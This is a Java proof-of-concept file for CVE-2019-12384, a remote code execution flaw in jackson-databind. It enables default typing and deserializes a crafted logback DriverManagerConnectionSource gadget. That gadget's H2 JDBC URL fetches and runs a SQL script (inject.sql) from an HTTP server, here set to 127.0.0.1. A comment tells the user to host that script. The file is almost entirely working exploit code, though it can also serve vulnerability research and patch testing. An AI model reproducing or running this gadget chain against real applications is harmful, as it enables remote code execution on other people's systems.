package com.test.jackson;

import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;

/**
 * CVE-2019-12384
 * jackson-databind RCE
 */

public class CVE_2019_12384 {

    public static void main(String[] args) throws Exception {
        ObjectMapper objectMapper = new ObjectMapper();
        objectMapper.enableDefaultTyping();//开启 defaultTyping
        //TODO 把resources文件inject.sql放到http服务器
        String json = "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", " +
                "{\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:80/inject.sql'\"}]";
        Object o = objectMapper.readValue(json, Object.class);//反序列化对象
        String s = objectMapper.writeValueAsString(o);//
    }
}
